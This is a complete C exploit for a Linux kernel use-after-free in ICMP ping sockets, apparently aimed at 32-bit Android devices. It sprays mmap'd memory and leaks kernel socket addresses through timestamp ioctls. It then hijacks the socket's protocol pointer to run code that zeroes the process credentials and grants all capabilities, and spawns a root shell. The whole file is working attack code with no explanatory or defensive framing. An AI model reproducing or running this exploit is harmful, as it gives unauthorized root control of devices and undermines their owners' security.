#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stdint.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <linux/in.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/sysinfo.h>

#define OOM_DISABLE          (-17)
#define LIST_POISON2         0x00200200
#define SLAB_POISON2         0x6b6b6b6b
#define ARRAY_SIZE(x)        (sizeof(x) / sizeof(*(x)))

/* offsets in sock struct */
#define SK_PROT              0x20
#define SK_STAMP             0x148
#define MC_LIST              0x1c4

#define MAX_CHILDREN         1024
#define MAX_SOCKETS          65000

#define MAX_MMAPS            1024
#define DEFAULT_RESV_SIZE    (14 * 1024 * 1024)

#define MMAP_SIZE            (2  * 1024 * 1024)
#define MMAP_BASE(x)         (((unsigned)(x)) & ~(MMAP_SIZE-1))

#define TIMESTAMP_MAGIC      0x00153636
#define NSEC_PER_SEC         1000000000

#define ADDR_ADD(p,n)        ((void *)((char *)(p)+(n)))

struct child_status_t {
    int num_sockets;
    int result;
};

size_t get_page_size()
{
    static size_t size;
    if (size == 0)
        size = sysconf(_SC_PAGESIZE);
    return size;
}

void populate_pgt(void *addr)
{
    *(void **)addr = NULL;
}

void *protect_crash_when_double_free(void)
{
    void  *addr;
    size_t page_size = get_page_size();

    addr = (void *)((LIST_POISON2/page_size)*page_size);
    addr = mmap(addr, page_size, 
                PROT_READ | PROT_WRITE,
                MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS,
                -1, 0);

    if (addr == MAP_FAILED) {
        printf("protect_crash_when_double_free mmap failed\n");
        return NULL;
    }

    populate_pgt(addr); // populate an empty page table

    if (mlock(addr, page_size) != 0) {
        printf("protect_crash_when_double_free mlock failed\n");
        return NULL;
    }

    return addr;
}

int get_max_fd_limit(void)
{
    struct rlimit rlim;
    int           ret = getrlimit(RLIMIT_NOFILE, &rlim);

    if (ret != 0)
        return -1;

    rlim.rlim_cur = rlim.rlim_max;
    ret = setrlimit(RLIMIT_NOFILE, &rlim);

    if (ret != 0)
        return -1;

    return rlim.rlim_cur;
}

int close_all_fds_except_pipe(int pipes, int num_fds)
{
    int i;
    int result = 0;

    for (i=0; i<num_fds; i++) {
        int ret;
        if (i == pipes)
            continue;
        ret = close(i);
    }
    return result;
}

int create_icmp_socket(void)
{
    struct sockaddr_in sa;
    int                sock;
    int                ret;

    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_INET;

    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
    if (sock == -1)
        return -1;

    ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
    if (ret != 0) {
        close(sock);
        return -1;
    }

    return sock;
}

int close_icmp_socket(int sock)
{
    return close(sock);
}

int send_status_to_parent(int pipes, int num_sockets, int result)
{
    struct child_status_t status;
    memset(&status, 0, sizeof status);

    status.num_sockets = num_sockets;
    status.result      = result;

    write(pipes, &status, sizeof status);

    return 0;
}

void wait_close(int pipes)
{
    close(pipes);

    while (1)
        sleep(60);
}

int do_child_task(int pipes, int num_fds)
{
    int socks[num_fds];
    int result = 0;
    int ret;
    int i;

    close_all_fds_except_pipe(pipes, num_fds);

    for (i=0; i<num_fds; i++) {
        socks[i] = create_icmp_socket();
        if (socks[i] == -1) {
            result = errno;
            break;
        }
    }

    num_fds = i;
    send_status_to_parent(pipes, num_fds, result);
    wait_close(pipes);

    for (i=0; i<num_fds; i++) 
        ret = close_icmp_socket(socks[i]);

    if (ret == -1)
        return -1;

    return 0;
}

int wait_sockets_created(int pipes, int *num_socks_created)
{
    struct child_status_t status;
    int                   i;
    int                   ret;

    *num_socks_created = 0;

    ret = fcntl(pipes, F_SETFL, O_NONBLOCK);
    if (ret == -1)
        return -1;

    for (i=0; i<50; i++) {
        ret = read(pipes, &status, sizeof status);
        if (ret == -1 && errno == EAGAIN) {
            usleep(100000);
            continue;
        }
        break;
    }

    if (ret == -1)
        return -1;
    if (ret != sizeof status) {
        return -1;
    }

    *num_socks_created = status.num_sockets;

    return status.result;
}

int create_child(int *pipes, int num_fds, pid_t *pid, int *num_socks_created)
{
    int pipe_fd[2];
    int ret;

    *pid = -1;
    *num_socks_created = 0;

    ret = pipe(pipe_fd);
    if (ret != 0)
        return -1;

    *pid = fork();
    if (*pid == -1)
        return -1;

    if (*pid == 0) { //child
        close(pipe_fd[0]);
        do_child_task(pipe_fd[1], num_fds);
        exit(0);
    }

    close(pipe_fd[1]);
    *pipes = pipe_fd[0];

    ret = wait_sockets_created(*pipes, num_socks_created);
    if (ret == EMFILE) //too many files
        ret = 0;
    if (ret != 0)
        kill(*pid, SIGKILL);

    return ret;
}

int close_child_sockets(int pipes, pid_t pid)
{
    int timeout;
    int status;
    int ret;
    int success = 0;

    close(pipes);
    kill(pid, SIGTERM);

    for (timeout=50; timeout>0; timeout--) {
        ret = waitpid(pid, &status, WNOHANG);
        if (ret != 0)
            break;

        if (WIFEXITED(status)) {
            success = 1;
            break;
        }

        usleep(100000);
    }

    kill(pid, SIGKILL);

    ret = waitpid(pid, &status, 0);
    if (ret != 0)
        return -1;

    if (WIFEXITED(status))
        success = 1;

    if (success)
        return 0;

    return -1;
}

int setup_vulnerable_sockets(int sock)
{
    struct sockaddr_in sa;
    int                ret;

    memset(&sa, 0, sizeof sa);
    sa.sin_family = AF_UNSPEC;

    ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
    if (ret != 0) {
        printf("connect(%d)#1 failed, ret=%d\n", sock, ret);
        return -1;
    }

    ret = connect(sock, (struct sockaddr *)&sa, sizeof sa);
    if (ret != 0) {
        printf("connect(%d)#2 failed, ret=%d\n", sock, ret);
        return -1;
    }

    return 0;
}

int *create_vulnerable_sockets(void)
{
    static pid_t pids[MAX_CHILDREN];
    static int   pipes[MAX_CHILDREN];
    int          num_socks = 0;
    int          num_children = 0;
    int          num_children_socks = 0;
    int          ret = 0;
    int          i;
    int          max_fds = get_max_fd_limit();
    int         *socks = malloc((max_fds+1)*sizeof(int));

    if (!socks) {
        printf("no memory for socks\n");
        return NULL;
    }

    for (i=0; i<MAX_CHILDREN; i++) {
        int max_children_socks;
        int num_socks_created;

        max_children_socks = max_fds;
        if (max_children_socks + num_children_socks > MAX_SOCKETS) {
            max_children_socks = MAX_SOCKETS - num_children_socks;
            if (max_children_socks<1)
                 break;
        }

        ret = create_child(&pipes[i], max_children_socks, &pids[i], &num_socks_created);
        if (pids[i] == -1)
            break;
        num_children++;
        num_children_socks += num_socks_created;

        if (num_socks < max_fds) {
            socks[num_socks] = create_icmp_socket();
            if (socks[num_socks] == -1)
                break;
            num_socks++;
        }

        if (ret != 0)
            break;
    }

    printf("%d + %d socks created\n", num_socks, num_children_socks);

    for (i=0; i<num_children; i++) {
        close_child_sockets(pipes[i], pids[i]);
    }

    if (num_socks < 1) {
        printf("no icmp sockets\n");
        free(socks);
        return NULL;
    }

    socks[num_socks] = -1;

    for (i=0; i<num_socks; i++) {
        ret = setup_vulnerable_sockets(socks[i]);
    }

    return socks;
}

void fill_with_payload(void *address, size_t size)
{
    unsigned *p = address;
    int       i;

    for (i=0; i<size; i+=sizeof (*p)*2) {
        *p++ = (unsigned)p;
        *p++ = TIMESTAMP_MAGIC;
    }
}

int get_sk_from_timestamp(int sock, unsigned long *paddr)
{
    struct timespec tv;
    uint64_t        value;
    uint32_t        high, low;
    int             ret;

    ret = ioctl(sock, SIOCGSTAMPNS, &tv);
    if (ret !=0)
        return -1;

    value = ((uint64_t)tv.tv_sec * NSEC_PER_SEC) + tv.tv_nsec;
    high  = (unsigned)(value >> 32);
    low   = (unsigned)value;

    if (high == TIMESTAMP_MAGIC) {
        if (paddr)
            *paddr = low - SK_STAMP; // get sk base addr
        return 1;
    }
    return 0;
}

int try_control_sk(int *socks)
{
    static int     resv_size = DEFAULT_RESV_SIZE;
    static int     loop_cnt  = 0;
    static void   *address[MAX_MMAPS];
    struct sysinfo info;
    int            success   = 0;
    int            count;
    int            i;
    int            ret;

    loop_cnt++;

    for (i=0; i<MAX_MMAPS; i++) {
        int j;

        ret = sysinfo(&info);
        if (ret == 0) {
            if (info.freeram < resv_size) {
                if (loop_cnt < 4)
                    resv_size = info.freeram;
                break;
            }
        }

        address[i] = mmap(NULL, MMAP_SIZE,
                          PROT_READ | PROT_WRITE | PROT_EXEC,
                          MAP_SHARED | MAP_ANONYMOUS,
                          -1, 0);
        if (address[i] == MAP_FAILED) {
            printf("mmap failed:%s(%d)\n", strerror(errno), errno);
            break;
        }

        mlock(address[i], MMAP_SIZE); // keep it in memory
        fill_with_payload(address[i], MMAP_SIZE);
        for (j=0; socks[j]!=-1; j++) {
            ret = get_sk_from_timestamp(socks[j], NULL);
            if (ret > 0) {
                success    = 1;
                address[i] = 0;
            }
        }

        if (success)
            break;
    }
    count = i;
    printf("%d bytes allocated\n", count*MMAP_SIZE);

    for (i=0; i<count; i++) {
        if (address[i])
            munmap(address[i], MMAP_SIZE);
    }

    if (success)
        return 0;

    return -1;
}

int protect_from_oom_killer(void)
{
    int  fd;
    char buf[16];
    int  ret;

    fd = open("/proc/self/oom_adj", O_WRONLY);
    if (fd == -1) {
        perror("open oom_adj in protect_from_oom_killer()");
        return -1;
    }

    sprintf(buf, "%d\n", OOM_DISABLE);

    ret = write(fd, buf, strlen(buf));
    if (ret == -1) {
        perror("write oom_adj in protect_from_oom_killer()");
        return -1;
    }

    ret = close(fd);
    if (ret == -1) {
        perror("close oom_adj in protect_from_oom_killer()");
        return -1;
    }

    return 0;
}

void keep_invalid_sk(void)
{
    pid_t pid;

    pid = fork();
    if (pid == -1 || pid == 0) {
        close(0);
        close(1);
        close(2);

        while (1)
            sleep(60);
    }
}

/* for root */
#define THREAD_SIZE   8192
#define KERNEL_START  0xc0000000

struct thread_info;
struct task_struct;
struct cred;
struct kernel_cap_struct;
struct task_security_struct;
struct list_head;

struct thread_info {
    unsigned long flags;
    int preempt_count;
    unsigned long addr_limit;
    struct task_struct *task;
    /* ... */
};

struct kernel_cap_struct {
    unsigned long cap[2];
};

struct cred {
    unsigned long usage;
    uid_t uid;
    gid_t gid;
    uid_t suid;
    gid_t sgid;
    uid_t euid;
    gid_t egid;
    uid_t fsuid;
    gid_t fsgid;
    unsigned int securebits;
    struct kernel_cap_struct cap_inheritable;
    struct kernel_cap_struct cap_permitted;
    struct kernel_cap_struct cap_effective;
    struct kernel_cap_struct cap_bset;
#if 0 //CONFIG_KEYS is not set
    unsigned char jit_keyring;
    void *session_keyring;
    void *process_keyring;
    void *thread_keyring;
    void *request_key_auth;
#endif
    struct task_security_struct *security;
};

struct task_security_struct {
    unsigned long osid;
    unsigned long sid;
    unsigned long exec_sid;
    unsigned long create_sid;
    unsigned long keycreate_sid;
    unsigned long sockcreate_sid;
};

struct list_head {
    struct list_head *next;
    struct list_head *prev;
};

struct task_struct_partial {
    struct list_head cpu_timer[3];
    const struct cred *real_cred;
    const struct cred *cred;
    char comm[16];
};

inline struct thread_info *current_thread_info(void)
{
    register unsigned long sp asm("sp");
    return (struct thread_info *)(sp & ~(THREAD_SIZE-1));
}

bool is_cpu_timer_valid(struct list_head *cpu_timer)
{
    if (cpu_timer->next != cpu_timer->prev)
        return false;

    if ((unsigned long int)cpu_timer->next < KERNEL_START)
        return false;

    return true;
}

void obtain_root_priv_by_modify_cred(void)
{
    struct thread_info          *info;
    struct cred                 *cred;
    struct task_security_struct *security;
    int i;

    info             = current_thread_info();
    info->addr_limit = -1;
    cred             = NULL;

    for (i=0; i<0x400; i+=4) {
        struct task_struct_partial *task = ((void *)info->task) + i;

        if (is_cpu_timer_valid(&task->cpu_timer[0]) &&
            is_cpu_timer_valid(&task->cpu_timer[1]) &&
            is_cpu_timer_valid(&task->cpu_timer[2]) &&
            task->real_cred == task->cred) {
                cred = task->cred;
                break;
        }
    }
    if (cred == NULL)
        return;

    cred->uid   = 0;
    cred->gid   = 0;
    cred->suid  = 0;
    cred->sgid  = 0;
    cred->euid  = 0;
    cred->egid  = 0;
    cred->fsuid = 0;
    cred->fsgid = 0;

    cred->cap_inheritable.cap[0] = 0xffffffff;
    cred->cap_inheritable.cap[1] = 0xffffffff;
    cred->cap_permitted.cap[0]   = 0xffffffff;
    cred->cap_permitted.cap[1]   = 0xffffffff;
    cred->cap_effective.cap[0]   = 0xffffffff;
    cred->cap_effective.cap[1]   = 0xffffffff;
    cred->cap_bset.cap[0]        = 0xffffffff;
    cred->cap_bset.cap[1]        = 0xffffffff;

    // modify sid from shell to kernel
    security = cred->security;
    if (security) {
        if (security->osid           != 0 &&
            security->sid            != 0 &&
            security->exec_sid       == 0 &&
            security->create_sid     == 0 &&
            security->keycreate_sid  == 0 &&
            security->sockcreate_sid == 0) {
                //security->osid = 1; // 1 is kernel which has no right to exec, needs to be set to sid you want
                //security->sid  = 1;
        }
    }
}

void setup_get_root(void *sk)
{
    static unsigned prot[256];
    unsigned       *mmap_end_addr;
    unsigned       *p;
    int             i;

    for (i=0; i<ARRAY_SIZE(prot); i++)
        prot[i] = (unsigned)obtain_root_priv_by_modify_cred;

    mmap_end_addr = (void*)MMAP_BASE(sk) + MMAP_SIZE - 1;

    for (i=MC_LIST-32; i<MC_LIST+32; i+=4) {
        p = ADDR_ADD(sk, i);
        if (p > mmap_end_addr)
            break;

        *p = 0;
    }

    for (i=SK_PROT-32; i<SK_PROT+32; i+=4) {
        p = ADDR_ADD(sk, i);
        if (p > mmap_end_addr)
            break;

        *p = (unsigned)prot;
    }
}

void do_get_root(int *socks)
{
    int success        = 0;
    int has_invalid_sk = 0;
    int ret;
    int i;

    for (i=0; socks[i] != -1; i++) {
        void *sk;
        ret = get_sk_from_timestamp(socks[i], (unsigned long *)&sk);
        if (ret <= 0) {
            has_invalid_sk = 1;
            continue;
        }

        setup_get_root(sk);
        close_icmp_socket(socks[i]);

        if (getuid() == 0)
            success = 1;
    }

    printf("get root, starting root shell\n");

    if (has_invalid_sk)
        protect_from_oom_killer();

    if (success)
        system("/system/bin/sh");
    else
        printf("failed to get root\n");

    if (has_invalid_sk)
        keep_invalid_sk();
}

int main(int argc, char *argv[])
{
    void *protect = NULL;
    int  *socks;
    int   ret;

    protect = protect_crash_when_double_free(); //map POISON2 to avoid crash
    if (!protect) {
        printf("mmap poison failed\n");
        return 1;
    }

    socks = create_vulnerable_sockets(); // build sockets to fullfill PING slub
    if (!socks) {
        printf("create sockets failed\n");
        return 1;
    }

    while (1) {
        ret = try_control_sk(socks);
        if (ret == 0) {
            printf("done\n");
            break;
        }
    }

    do_get_root(socks); 

    if (protect) {
        ret = munmap(protect, get_page_size());
        if (ret != 0) {
            printf("unmap poison failed\n");
            return -1;
        }
    }

    return 0;
}

